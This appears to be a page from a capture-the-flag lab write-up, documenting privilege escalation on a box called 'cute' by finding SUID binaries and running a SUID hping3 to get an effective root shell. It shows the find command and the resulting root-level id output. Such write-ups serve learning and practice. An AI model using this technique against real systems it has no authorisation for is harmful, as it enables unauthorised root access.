---
layout: default
title: hping3
parent: SUID
nav_order: 2
---

# hping3 (Suid)

---

## SUID Permissions

```bash
www-data@cute:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/mount
/usr/sbin/hping3
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device

```

## Exploit hping3 SUID

![suid](../../../../assets/images/ctfs/proving_grounds/bbscute/suid.png)

Simply executing the _hping3_ binary gives us a root shell.

```bash
www-data@cute:/$ /usr/sbin/hping3
hping3> id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

```
